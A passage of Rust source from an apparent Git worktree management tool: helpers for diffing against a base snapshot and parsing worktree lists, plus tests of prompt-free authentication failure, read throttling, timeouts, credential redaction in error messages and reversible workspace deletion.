/// GIT-038 (T-033-c): every file that differs between the commit `since` (the base's snapshot)
/// and the working tree, untracked files included, in the shape All Changes already reads.
pub fn base_entries(worktree: &Path, since: &str) -> Result<Vec<Entry>, String> {
    let stats = diff_stats_with(worktree, &[since, "--"])?;
    let mut rels: Vec<&String> = stats.keys().collect();
    rels.sort();
    let mut out: Vec<Entry> = rels
        .into_iter()
        .map(|rel| {
            let s = &stats[rel];
            let path = worktree.join(native(rel)).to_string_lossy().into_owned();
            let disk = std::fs::metadata(&path).ok().map(|m| format!("{}-{:?}", m.len(), m.modified().ok())).unwrap_or_default();
            Entry { path, staged: false, code: s.code, lines: s.lines, binary: s.binary, stamp: format!("{since}:{}|{disk}", s.ids) }
        })
        .collect();
    let untracked = output(&["ls-files", "--others", "--exclude-standard", "-z"], Some(worktree))?;
    for rel in String::from_utf8_lossy(&untracked).split('\0').filter(|r| !r.is_empty()) {
        let path = worktree.join(native(rel)).to_string_lossy().into_owned();
        let disk = std::fs::metadata(&path).ok().map(|m| format!("{}-{:?}", m.len(), m.modified().ok())).unwrap_or_default();
        let (lines, binary) = whole_file(&path);
        out.push(Entry { path, staged: false, code: '?', lines, binary, stamp: disk });
    }
    Ok(out)
}

/// The two texts of a file against the base snapshot `since`: what the base had, and the working
/// file (empty when the file is new there, or gone here).
pub fn base_sides(file: &Path, since: &str) -> Result<(String, String), String> {
    let dir = file.parent().filter(|d| !d.as_os_str().is_empty()).ok_or_else(|| format!("{} is not a file path", file.display()))?;
    let name = file.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    let old = output(&["cat-file", "--filters", &format!("{since}:./{name}")], Some(dir)).unwrap_or_default();
    let work = match std::fs::read(file) {
        Ok(b) => b,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Vec::new(),
        Err(e) => return Err(format!("{}: {e}", file.display())),
    };
    let text = |b: Vec<u8>| String::from_utf8(b).map_err(|_| format!("{} is not UTF-8 text", file.display()));
    Ok((text(old)?, text(work)?))
}

/// Line count and binary-ness of a file git has no diff for (untracked).
fn whole_file(path: &str) -> (Option<u64>, bool) {
    // ponytail: an untracked file is read whole for its line count; cap the read if huge untracked files get common
    let bytes = std::fs::read(path).unwrap_or_default();
    let binary = bytes.iter().take(8000).any(|&b| b == 0);
    let lines = (!binary).then(|| bytes.iter().filter(|&&b| b == b'\n').count() as u64 + u64::from(bytes.last().is_some_and(|&b| b != b'\n')));
    (lines, binary)
}

/// `git diff <extra> --numstat` and `--raw` by path (relative to the top, with forward slashes).
fn diff_stats_with(worktree: &Path, extra: &[&str]) -> Result<std::collections::HashMap<String, Stat>, String> {
    let mut map: std::collections::HashMap<String, Stat> = std::collections::HashMap::new();
    let with = |args: &[&str]| -> Vec<String> { args.iter().chain(extra.iter()).map(|s| s.to_string()).collect() };
    let args = with(&["diff", "--numstat", "-z", "--no-renames"]);
    let numstat = output(&args.iter().map(String::as_str).collect::<Vec<_>>(), Some(worktree))?;
    for rec in String::from_utf8_lossy(&numstat).split('\0') {
        let mut f = rec.splitn(3, '\t');
        if let (Some(a), Some(r), Some(p)) = (f.next(), f.next(), f.next()) {
            let s = map.entry(p.to_string()).or_default();
            s.binary = a == "-";
            s.lines = a.parse::<u64>().ok().zip(r.parse::<u64>().ok()).map(|(a, r)| a + r);
        }
    }
    let args = with(&["diff", "--raw", "-z", "--no-abbrev", "--no-renames"]);
    let raw = output(&args.iter().map(String::as_str).collect::<Vec<_>>(), Some(worktree))?;
    let text = String::from_utf8_lossy(&raw);
    let mut parts = text.split('\0');
    while let (Some(head), Some(p)) = (parts.next(), parts.next()) {
        let ids: Vec<&str> = head.split(' ').collect();
        if ids.len() >= 4 {
            let s = map.entry(p.to_string()).or_default();
            s.ids = format!("{}-{}", ids[2], ids[3]);
            s.code = ids.get(4).and_then(|c| c.chars().next()).unwrap_or('M');
        }
    }
    Ok(map)
}

/// Parses `git worktree list --porcelain`: blank-line separated blocks, the first is the main
/// checkout. `branch refs/heads/x` is absent for a detached head.
pub fn parse_worktrees(text: &str) -> Vec<Worktree> {
    let mut out = Vec::new();
    for (i, block) in text.split("\n\n").enumerate() {
        let mut path = None;
        let mut head = String::new();
        let mut branch = None;
        let mut locked = None;
        for line in block.lines() {
            let line = line.trim_end_matches('\r');
            if let Some(p) = line.strip_prefix("worktree ") {
                path = Some(native(p));
            } else if let Some(h) = line.strip_prefix("HEAD ") {
                head = h.to_string();
            } else if let Some(b) = line.strip_prefix("branch ") {
                branch = Some(b.strip_prefix("refs/heads/").unwrap_or(b).to_string());
            } else if line == "locked" {
                locked = Some(String::new());
            } else if let Some(r) = line.strip_prefix("locked ") {
                locked = Some(r.to_string());
            }
        }
        if let Some(path) = path {
            out.push(Worktree { path, branch, head, is_main: i == 0, name: None, parent: None, locked, hidden: false, kind: String::new(), source: None, made_by: None, number: None, comment: None });
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn an_unattended_git_fails_fast_on_a_remote_that_wants_a_password() {
        use std::io::{Read, Write};
        // A remote that answers every request with "who are you?" and nothing else.
        let server = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = server.local_addr().unwrap().port();
        std::thread::spawn(move || {
            for mut conn in server.incoming().flatten().take(8) {
                let mut buf = [0u8; 4096];
                let _ = conn.read(&mut buf);
                let _ = conn.write_all(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm=\"private\"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
            }
        });
        // Only NO_PROMPT is under test: a config pair or password helper the parent shell injected
        // (credential.interactive, GIT_ASKPASS) would change git's words, so they are left out.
        ISOLATED.with(|i| i.set(true));
        let url = format!("http://127.0.0.1:{port}/private.git");
        let mut cmd = command(&["-c", "credential.helper=", "ls-remote", &url], None);
        cmd.envs(NO_PROMPT).stdin(std::process::Stdio::null()).stdout(std::process::Stdio::null()).stderr(std::process::Stdio::piped());
        // T-700 (K2): the clock covers git alone, from its start to its exit. A prompt never returns, so the
        // watchdog only has to tell "waiting for an answer" from "slow": a busy CI runner once took git past
        // 30 s to fail as it should. "Terminal prompts disabled" below is the proof that git asked nobody.
        let began = std::time::Instant::now();
        let mut child = cmd.spawn().unwrap();
        while child.try_wait().unwrap().is_none() {
            if began.elapsed() > std::time::Duration::from_secs(90) {
                let _ = child.kill();
                panic!("git still waiting after 90 s, as a password prompt would");
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        let out = child.wait_with_output().unwrap();
        let said = String::from_utf8_lossy(&out.stderr).to_lowercase();
        assert!(!out.status.success());
        assert!(said.contains("terminal prompts disabled"), "{said}");
    }

    #[test]
    fn git038_base_entries_list_every_difference_from_the_snapshot_and_the_sides_read_against_it() {
        let dir = temp_repo("base");
        run(&["config", "core.autocrlf", "false"], Some(&dir)).unwrap();
        fs::write(dir.join("a.txt"), "one\ntwo\n").unwrap();
        run(&["add", "."], Some(&dir)).unwrap();
        run(&["commit", "-q", "-m", "a"], Some(&dir)).unwrap();
        let since = run(&["rev-parse", "HEAD"], Some(&dir)).unwrap().trim().to_string();
        // A committed change, a working-tree change, a new untracked file, a deletion.
        fs::write(dir.join("a.txt"), "one\ntwo\nthree\n").unwrap();
        run(&["commit", "-q", "-am", "a again"], Some(&dir)).unwrap();
        fs::write(dir.join("README.md"), "hello\nworld\n").unwrap();
        fs::write(dir.join("new.txt"), "fresh").unwrap();
        let entries = base_entries(&dir, &since).unwrap();
        let rel = |e: &Entry| Path::new(&e.path).strip_prefix(&dir).unwrap().to_string_lossy().replace('\\', "/");
        let got: Vec<(String, char, Option<u64>, bool)> = entries.iter().map(|e| (rel(e), e.code, e.lines, e.staged)).collect();
        assert_eq!(got, vec![("README.md".to_string(), 'M', Some(1), false), ("a.txt".to_string(), 'M', Some(1), false), ("new.txt".to_string(), '?', Some(1), false)]);
        assert!(entries[0].stamp.starts_with(&format!("{since}:")), "{}", entries[0].stamp);
        assert_eq!(base_sides(&dir.join("README.md"), &since).unwrap(), ("hello\n".to_string(), "hello\nworld\n".to_string()));
        assert_eq!(base_sides(&dir.join("new.txt"), &since).unwrap(), (String::new(), "fresh".to_string()));
        fs::remove_file(dir.join("a.txt")).unwrap();
        let entries = base_entries(&dir, &since).unwrap();
        assert_eq!(entries.iter().map(|e| (rel(e), e.code)).collect::<Vec<_>>(), vec![("README.md".to_string(), 'M'), ("a.txt".to_string(), 'D'), ("new.txt".to_string(), '?')]);
        assert_eq!(base_sides(&dir.join("a.txt"), &since).unwrap(), ("one\ntwo\n".to_string(), String::new()));
        let _ = fs::remove_dir_all(&dir);
    }

    fn temp_repo(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("kolux-rs-git-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        run(&["init", "-q", "-b", "main"], Some(&dir)).unwrap();
        run(&["config", "user.email", "test@example.com"], Some(&dir)).unwrap();
        run(&["config", "user.name", "Kolux test"], Some(&dir)).unwrap();
        fs::write(dir.join("README.md"), "hello\n").unwrap();
        run(&["add", "."], Some(&dir)).unwrap();
        run(&["commit", "-q", "-m", "first"], Some(&dir)).unwrap();
        dir
    }

    #[test]
    fn cli018_only_commands_that_change_the_worktree_list_count_as_a_change() {
        let counts = |args: &[&str]| WorktreeChange::watch(args).0;
        for args in [&["worktree", "add", "-b", "x", "d", "main"][..], &["-c", "gc.auto=0", "worktree", "remove", "d"], &["worktree", "move", "a", "b"], &["worktree", "prune"], &["worktree", "repair"], &["-C", "worktree", "worktree", "add", "d"]] {
            assert!(counts(args), "{args:?}");
        }
        for args in [&["worktree", "list", "--porcelain"][..], &["status"], &["branch", "-D", "worktree"], &["worktree"], &[], &["commit", "-m", "worktree", "add"], &["-C", "worktree", "status"]] {
            assert!(!counts(args), "{args:?}");
        }
    }

    #[test]
    fn cli018_adding_then_removing_a_worktree_counts_as_two_changes() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("wt-count");
        let dest = std::env::temp_dir().join(format!("kolux-rs-git-wt-count-ws-{}", std::process::id())).join("c");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        let mine = || THIS_THREAD_CHANGES.with(|c| c.get());
        let before = mine();
        git.worktree_add(&repo, &dest, "c", "HEAD").unwrap();
        assert_eq!(mine() - before, 1, "add");
        git.worktree_remove(&repo, &dest, Some("c")).unwrap();
        assert_eq!(mine() - before, 2, "remove, whose normal path runs no git worktree command");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
    }

    #[test]
    fn git070_only_short_reads_take_a_turn_and_long_running_commands_are_exempt() {
        for args in [&["status", "--porcelain=v2"][..], &["-c", "core.quotepath=off", "diff", "--numstat"], &["-C", "x", "log", "-1"], &["rev-parse", "HEAD"], &["worktree", "list", "--porcelain"], &["for-each-ref"]] {
            assert!(short_read(args), "{args:?}");
        }
        for args in [&["worktree", "add", "-b", "x", "d", "main"][..], &["fetch", "origin"], &["clone", "u", "d"], &["push", "-u", "origin", "x"], &["pull"], &["commit", "-m", "x"], &["-c", "alias.x=!sleep 1", "x"], &["--version"], &["worktree", "remove", "d"], &[]] {
            assert!(!short_read(args), "{args:?}");
        }
    }

    #[test]
    fn git070_turns_are_per_worktree_and_exempt_commands_never_wait() {
        ISOLATED.with(|i| i.set(true));
        let (a, b) = (temp_repo("git070-a"), temp_repo("git070-b"));
        static L: Limiter = Limiter::new(1);
        let held = L.enter(&a, false);
        // A short read on the busy worktree waits for its turn...
        let (tx, rx) = std::sync::mpsc::channel();
        let a2 = a.clone();
        let waiter = std::thread::spawn(move || {
            ISOLATED.with(|i| i.set(true));
            let _ = tx.send(gated(&["rev-parse", "HEAD"], Some(&a2), &L, SHORT_READ_LIMIT));
        });
        assert!(rx.recv_timeout(std::time::Duration::from_millis(400)).is_err(), "a short read waited for the worktree's turn");
        // ...while another worktree's short read does not (no app-wide cap)...
        assert!(gated(&["rev-parse", "HEAD"], Some(&b), &L, SHORT_READ_LIMIT).is_ok());
        // ...and fetch and worktree add on the busy worktree run at once, with no turn taken.
        assert!(gated(&["fetch", "-q", "."], Some(&a), &L, SHORT_READ_LIMIT).is_ok());
        let wt = a.with_file_name(format!("{}-wt", a.file_name().unwrap().to_string_lossy()));
        let _ = fs::remove_dir_all(&wt);
        assert!(gated(&["worktree", "add", "-q", "-b", "side", &wt.to_string_lossy(), "main"], Some(&a), &L, SHORT_READ_LIMIT).is_ok());
        assert_eq!(L.running(&a), 1, "only the held turn is counted");
        drop(held);
        assert!(rx.recv_timeout(std::time::Duration::from_secs(30)).unwrap().is_ok(), "the waiting read ran once the turn was free");
        waiter.join().unwrap();
        assert_eq!(L.running(&a), 0);
        for d in [&wt, &a, &b] {
            let _ = fs::remove_dir_all(d);
        }
    }

    #[test]
    fn git070_waiting_foreground_reads_go_before_waiting_background_reads_on_one_worktree() {
        static L: Limiter = Limiter::new(1);
        let dir = Path::new("git070-order");
        let order = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
        let held = L.enter(dir, false);
        let wait = |fg: bool, name: &'static str| {
            let order = order.clone();
            std::thread::spawn(move || {
                let _t = L.enter(dir, fg);
                order.lock().unwrap().push(name);
            })
        };
        let bg = wait(false, "background");
        std::thread::sleep(std::time::Duration::from_millis(150));
        let fg = wait(true, "foreground");
        std::thread::sleep(std::time::Duration::from_millis(150));
        drop(held);
        bg.join().unwrap();
        fg.join().unwrap();
        assert_eq!(*order.lock().unwrap(), ["foreground", "background"]);
        assert_eq!(L.running(dir), 0);
    }

    #[test]
    fn git070_a_hung_short_read_is_stopped_at_its_limit_and_the_next_read_runs() {
        ISOLATED.with(|i| i.set(true));
        let dir = temp_repo("git070-hang");
        fs::write(dir.join("README.md"), "changed\n").unwrap();
        static L: Limiter = Limiter::new(4);
        let started = std::time::Instant::now();
        // diff hands each changed file to an external tool that never ends.
        let err = gated(&["-c", "diff.external=sleep 20;:", "diff", "--ext-diff"], Some(&dir), &L, std::time::Duration::from_millis(600)).unwrap_err();
        assert!(started.elapsed() < std::time::Duration::from_secs(10), "stopped at the limit: {:?}", started.elapsed());
        assert!(err.contains("did not finish"), "{err}");
        assert_eq!(L.running(&dir), 0, "the turn is given back");
        assert!(gated(&["diff", "--name-only"], Some(&dir), &L, SHORT_READ_LIMIT).unwrap().starts_with(b"README.md"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[cfg(windows)]
    #[test]
    fn git070_long_windows_paths_are_switched_on_without_changing_the_command_line() {
        let cmd = command(&["status"], None);
        let env: Vec<_> = cmd.get_envs().filter_map(|(k, v)| Some((k.to_string_lossy().into_owned(), v?.to_string_lossy().into_owned()))).collect();
        // T-779: the slot number follows the user's own pairs (and core.fsmonitor takes the first of
        // ours), so what matters is a key slot naming core.longpaths with "true" in the same slot.
        let slot = env.iter().find(|(k, v)| k.starts_with("GIT_CONFIG_KEY_") && v == "core.longpaths").map(|(k, _)| k["GIT_CONFIG_KEY_".len()..].to_string());
        let slot = slot.unwrap_or_else(|| panic!("no core.longpaths slot: {env:?}"));
        assert!(env.contains(&(format!("GIT_CONFIG_VALUE_{slot}"), "true".into())), "{env:?}");
        let count: usize = env.iter().find(|(k, _)| k == "GIT_CONFIG_COUNT").map(|(_, v)| v.parse().unwrap()).unwrap();
        assert!(slot.parse::<usize>().unwrap() < count, "the slot is inside the count: {env:?}");
        assert_eq!(cmd.get_args().collect::<Vec<_>>(), ["status"]);
    }

    #[test]
    fn proj027_the_add_wait_defaults_to_three_minutes_and_the_override_is_clamped() {
        let min = std::time::Duration::from_secs(180);
        assert_eq!(add_timeout(None), min);
        assert_eq!(add_timeout(Some("nonsense")), min);
        assert_eq!(add_timeout(Some("1000")), min, "below the floor");
        assert_eq!(add_timeout(Some("600000")), std::time::Duration::from_secs(600));
        assert_eq!(add_timeout(Some(" 600000 ")), std::time::Duration::from_secs(600));
        assert_eq!(add_timeout(Some("99999999")), std::time::Duration::from_secs(1800), "above the ceiling");
    }

    #[test]
    fn proj027_a_git_that_stalls_is_stopped_with_a_message_naming_the_wait_and_the_cause() {
        ISOLATED.with(|i| i.set(true));
        let dir = temp_repo("proj027-stall");
        let started = std::time::Instant::now();
        let err = run_within(&["-c", "alias.stall=!sleep 20", "stall"], Some(&dir), std::time::Duration::from_millis(400)).unwrap_err();
        assert!(started.elapsed() < std::time::Duration::from_secs(10), "stopped at the limit, not at the end of the stall");
        assert!(err.contains("did not finish") && err.contains("cloud service"), "{err}");
        // A quick git still answers, with output trimmed; a failing one carries its stderr.
        assert_eq!(run_within(&["rev-parse", "--abbrev-ref", "HEAD"], Some(&dir), std::time::Duration::from_secs(30)).unwrap(), "main");
        assert!(run_within(&["rev-parse", "--verify", "nope"], Some(&dir), std::time::Duration::from_secs(30)).is_err());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn t315_a_failed_clone_comes_down_to_its_last_fatal_line_without_progress() {
        // A real clone into a folder that exists and is not empty.
        ISOLATED.with(|i| i.set(true));
        let src = temp_repo("t315-src");
        let dest = std::env::temp_dir().join(format!("kolux-rs-git-t315-dest-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dest);
        fs::create_dir_all(&dest).unwrap();
        fs::write(dest.join("keep.txt"), "mine\n").unwrap();
        let out = command(&["clone", "--progress", "--", &native(&src.to_string_lossy()), &native(&dest.to_string_lossy())], None).output().unwrap();
        assert!(!out.status.success());
        let reason = failure_reason(&String::from_utf8_lossy(&out.stderr)).unwrap();
        assert!(reason.starts_with("Destination path") && reason.contains("already exists"), "{reason}");
        // A clone that fails part-way: progress (with \r redraws) and trailing fragments never show.
        let log = "Cloning into 'x'...\nremote: Enumerating objects: 5, done.\nReceiving objects:  10% (1/9)\rReceiving objects:  40% (4/9)\nerror: RPC failed; curl 56 recv failure\nfatal: early EOF\nfatal: fetch-pack: invalid index-pack output\nremote: \n";
        assert_eq!(failure_reason(log).as_deref(), Some("Fetch-pack: invalid index-pack output"));
        assert_eq!(failure_reason("error: cannot lock ref\nReceiving objects: 100%").as_deref(), Some("Cannot lock ref"));
        assert_eq!(failure_reason("warning: could not find UI helper\n").as_deref(), Some("Warning: could not find UI helper"));
        assert_eq!(failure_reason("Cloning into 'x'...\nReceiving objects:  3%\r"), None);
        let _ = fs::remove_dir_all(&src);
        let _ = fs::remove_dir_all(&dest);
    }

    /// FIX-2 AFTER 3: the reason never shows a password or token that was in the link, and a
    /// line git ended with a bare \r still counts.
    #[test]
    fn fix2_a_clone_reason_hides_the_link_password_and_keeps_a_last_redrawn_line() {
        let log = "Cloning into 'x'...\nfatal: unable to access 'https://me:ghp_secret123@github.com/o/r.git/': The requested URL returned error: 403\n";
        let reason = failure_reason(log).unwrap();
        assert!(!reason.contains("ghp_secret123") && !reason.contains("me:"), "{reason}");
        assert!(reason.contains("https://***@github.com/o/r.git/"), "{reason}");
        assert_eq!(failure_reason("Receiving objects:  3%\rfatal: repository not found\r").as_deref(), Some("Repository not found"));
        assert_eq!(failure_reason("fatal: gone\r\n").as_deref(), Some("Gone"));
    }

    #[test]
    fn merge_predictions_need_git_2_38() {
        let g = |v: &str| Git { version: v.into() }.predicts_merges();
        assert!(!g("git version 2.37.1") && !g("git version 1.9.5.msysgit.1"));
        assert!(g("git version 2.38.0") && g("git version 2.55.0.windows.3") && g("git version 3.0.0"));
        // A version that cannot be read is tried; merge-tree itself then says whether it can.
        assert!(g("something else"));
    }

    #[test]
    fn detects_git_and_rejects_plain_folders() {
        let git = Git::detect().unwrap();
        assert!(git.version.starts_with("git version"));
        let plain = std::env::temp_dir().join(format!("kolux-rs-plain-{}", std::process::id()));
        fs::create_dir_all(&plain).unwrap();
        let err = git.toplevel(&plain).unwrap_err();
        assert!(err.contains("not inside a Git repository"), "{err}");
        assert!(git.toplevel(&plain.join("missing")).unwrap_err().contains("not a folder"));
        fs::remove_dir_all(&plain).unwrap();
    }

    #[test]
    fn worktree_add_then_remove_round_trip() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("wt");
        fs::create_dir_all(repo.join("src")).unwrap();
        let top = git.toplevel(&repo.join("src")).unwrap();
        assert_eq!(top.canonicalize().unwrap(), repo.canonicalize().unwrap(), "a subfolder resolves to the repository root");
        assert_eq!(git.toplevel(&repo.join(".git")).unwrap().canonicalize().unwrap(), repo.canonicalize().unwrap(), "the .git folder itself means the repository");

        let before = git.worktrees(&repo).unwrap();
        assert_eq!(before.len(), 1);
        assert!(before[0].is_main);
        assert_eq!(before[0].branch.as_deref(), Some("main"));

        let dest = std::env::temp_dir().join(format!("kolux-rs-git-wt-ws-{}", std::process::id())).join("fix-login");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        git.worktree_add(&repo, &dest, "fix-login", "HEAD").unwrap();
        assert!(dest.join("README.md").is_file(), "worktree folder has the files");
        assert!(git.branch_taken(&repo, "fix-login"));
        let list = git.worktrees(&repo).unwrap();
        assert_eq!(list.len(), 2);
        let added = list.iter().find(|w| !w.is_main).unwrap();
        assert_eq!(added.branch.as_deref(), Some("fix-login"));
        assert_eq!(PathBuf::from(&added.path).canonicalize().unwrap(), dest.canonicalize().unwrap());

        assert_eq!(git.worktree_remove(&repo, &dest, Some("fix-login")).unwrap(), None);
        assert!(!dest.exists(), "folder is gone");
        assert!(!git.branch_taken(&repo, "fix-login"), "branch is gone");
        assert_eq!(git.worktrees(&repo).unwrap().len(), 1);

        fs::remove_dir_all(dest.parent().unwrap()).unwrap();
        fs::remove_dir_all(&repo).unwrap();
    }

    #[test]
    fn proj074_a_deleted_workspace_goes_through_a_hidden_trash_and_can_be_moved_back() {
        let base = std::env::temp_dir().join(format!("kolux-rs-git-trash-{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        let dest = base.join("big");
        fs::create_dir_all(dest.join("deep/er")).unwrap();
        fs::write(dest.join("deep/er/f.txt"), "x").unwrap();
        let trash = move_to_trash(&dest).unwrap();
        assert!(!dest.exists(), "the folder is gone from its place at once");
        let name = trash.file_name().unwrap().to_string_lossy().into_owned();
        assert!(trash.join("deep/er/f.txt").is_file() && trash.parent() == Some(base.as_path()) && is_trash_name(&name) && name.ends_with("-big"), "{name}");
        // the removal is undone: the folder goes back to where Git expects it
        move_back(&trash, &dest).unwrap();
        assert!(dest.join("deep/er/f.txt").is_file() && !trash.exists());
        // and the second time it is deleted off the caller's thread
        let trash = move_to_trash(&dest).unwrap();
        assert!(spawn_empty_trash(trash.clone()).join().unwrap());
        assert!(!trash.exists() && !dest.exists());
        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn row128_a_trash_folder_whose_move_back_failed_is_kept_by_the_launch_sweep() {
        let base = std::env::temp_dir().join(format!("kolux-rs-git-r128-{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        let dest = base.join("work");
        fs::create_dir_all(&dest).unwrap();
        fs::write(dest.join("notes.txt"), "work the user still needs").unwrap();
        let trash = move_to_trash(&dest).unwrap();
        // something took the folder's place meanwhile, so moving it back fails
        fs::create_dir_all(dest.join("other")).unwrap();
        let err = move_back(&trash, &dest).unwrap_err();
        let _ = sweep_trash(&base);
        assert!(trash.join("notes.txt").is_file(), "the launch sweep must never delete a folder whose move back failed");
        assert!(err.contains(&trash.display().to_string()), "the error says where the folder is kept: {err}");
        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn proj074_the_sweep_clears_confirmed_trash_of_the_exact_shape_and_nothing_else() {
        let base = std::env::temp_dir().join(format!("kolux-rs-git-sweep-{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        // row 130: only `.kolux-trash-<hex>-<hex>-<name>` counts; the old forms are left alone
        for dir in [".kolux-trash-1a-2b-otter", ".kolux-trash-1a-2c-work", ".kolux-trash-otter", "otter.kolux-trash", ".kolux-trash-zz-2b-otter", ".kolux-trash-1a-2b-", "otter", ".kolux-trash-", ".git", "trash", "keep.kolux-trash-x"] {
            fs::create_dir_all(base.join(dir)).unwrap();
            fs::write(base.join(dir).join("f.txt"), "x").unwrap();
        }
        confirm_trash(&base.join(".kolux-trash-1a-2b-otter"));
        fs::write(base.join(".kolux-trash-1a-2b-file"), "a file with a trash name is not a folder").unwrap();
        let swept = sweep_trash(&base);
        let names = |v: &[PathBuf]| v.iter().map(|p| p.file_name().unwrap().to_string_lossy().into_owned()).collect::<Vec<_>>();
        assert_eq!(names(&swept.gone), vec![".kolux-trash-1a-2b-otter"]);
        // row 128: a trash folder whose removal was never confirmed is kept and reported
        assert_eq!(names(&swept.kept), vec![".kolux-trash-1a-2c-work"]);
        for kept in [".kolux-trash-1a-2c-work", ".kolux-trash-otter", "otter.kolux-trash", ".kolux-trash-zz-2b-otter", ".kolux-trash-1a-2b-", "otter", ".kolux-trash-", ".git", "trash", "keep.kolux-trash-x", ".kolux-trash-1a-2b-file"] {
            assert!(base.join(kept).exists(), "{kept} must stay");
        }
        assert!(sweep_trash(&base.join("no-such-folder")).gone.is_empty());
        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn row128_a_confirmed_delete_cut_short_keeps_its_mark_until_the_last_file_goes() {
        let base = std::env::temp_dir().join(format!("kolux-rs-git-r128c-{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        let trash = base.join(".kolux-trash-1-2-big");
        fs::create_dir_all(trash.join("deep")).unwrap();
        fs::write(trash.join("deep/f.txt"), "x").unwrap();
        confirm_trash(&trash);
        assert!(clear_confirmed_last(&trash) && !trash.exists());
        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn row127_undoing_a_removal_puts_back_the_folder_and_gits_record_whole() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("r127");
        let dest = std::env::temp_dir().join(format!("kolux-rs-git-r127-ws-{}", std::process::id())).join("undo-me");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        git.worktree_add(&repo, &dest, "undo-me", "HEAD").unwrap();
        fs::write(dest.join("work.txt"), "uncommitted work").unwrap();
        let dest_s = dest.to_string_lossy().into_owned();
        // the removal's first half: folder to the trash, Git's record set aside
        let trash = move_to_trash(&dest).unwrap();
        let record = crate::projects::set_aside_record(&repo, &dest_s).unwrap();
        assert_eq!(git.worktrees(&repo).unwrap().len(), 1, "Git no longer lists it");
        // the undo
        record.restore().unwrap();
        move_back(&trash, &dest).unwrap();
        assert_eq!(git.worktrees(&repo).unwrap().len(), 2, "Git lists it again");
        assert!(git.dirty(&dest).unwrap(), "Git reads the restored workspace and its uncommitted file");
        assert!(dest.join("work.txt").is_file());
        // and a confirmed removal leaves nothing set aside
        git.worktree_remove(&repo, &dest, Some("undo-me")).unwrap();
        let common = repo.join(".git");
        assert!(!common.join("kolux-set-aside").exists(), "nothing left set aside once the removal is confirmed");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        let _ = fs::remove_dir_all(&repo);
    }

    #[test]
    fn row110_removing_a_locked_worktree_leaves_folder_and_record_in_place() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("r110");
        let dest = std::env::temp_dir().join(format!("kolux-rs-git-r110-ws-{}", std::process::id())).join("on-usb");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        git.worktree_add(&repo, &dest, "on-usb", "HEAD").unwrap();
        fs::write(dest.join("work.txt"), "work").unwrap();
        run(&["worktree", "lock", &dest.to_string_lossy()], Some(&repo)).unwrap();
        assert!(git.worktree_remove(&repo, &dest, Some("on-usb")).is_err(), "a locked worktree is refused");
        assert!(dest.join("work.txt").is_file(), "its folder is back in place");
        assert_eq!(git.worktrees(&repo).unwrap().len(), 2, "Git still lists it");
        let left: Vec<String> = fs::read_dir(dest.parent().unwrap()).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
        assert_eq!(left, vec!["on-usb".to_string()], "no trash folder left behind");
        run(&["worktree", "unlock", &dest.to_string_lossy()], Some(&repo)).unwrap();
        let _ = git.worktree_remove(&repo, &dest, Some("on-usb"));
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        let _ = fs::remove_dir_all(&repo);
    }

    // Windows only: a handle opened with no share mode is what stops a rename or delete under it.
    #[cfg(windows)]
    #[test]
    fn row110_a_file_held_open_by_another_program_stops_the_removal_with_everything_still_there() {
        use std::os::windows::fs::OpenOptionsExt;
        let git = Git::detect().unwrap();
        let repo = temp_repo("r110h");
        let dest = std::env::temp_dir().join(format!("kolux-rs-git-r110h-ws-{}", std::process::id())).join("held");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        git.worktree_add(&repo, &dest, "held", "HEAD").unwrap();
        fs::create_dir_all(dest.join("a/b")).unwrap();
        let files = ["work.txt", "a/one.txt", "a/b/two.txt", "a/b/held.txt", "a/b/three.txt"];
        for f in files {
            fs::write(dest.join(f), "uncommitted work").unwrap();
        }
        let holder = fs::OpenOptions::new().read(true).write(true).share_mode(0).open(dest.join("a/b/held.txt")).unwrap();
        let outcome = git.worktree_remove(&repo, &dest, Some("held"));
        drop(holder);
        let err = outcome.unwrap_err();
        assert!(err.contains("nothing was deleted"), "the refusal says nothing was touched: {err}");
        for f in files {
            assert!(dest.join(f).is_file(), "{f} must still be there: nothing is deleted piecemeal");
        }
        assert_eq!(git.worktrees(&repo).unwrap().len(), 2, "Git still lists it");
        assert!(git.dirty(&dest).unwrap(), "the folder is still a workspace Git can read");
        let left: Vec<String> = fs::read_dir(dest.parent().unwrap()).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
        assert_eq!(left, vec!["held".to_string()], "no trash folder left behind");
        git.worktree_remove(&repo, &dest, Some("held")).unwrap();
        assert!(!dest.exists(), "once the program lets go, the removal goes through");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        let _ = fs::remove_dir_all(&repo);
    }

    #[test]
    fn row129_a_kept_branch_is_deleted_only_while_it_still_points_where_it_did() {
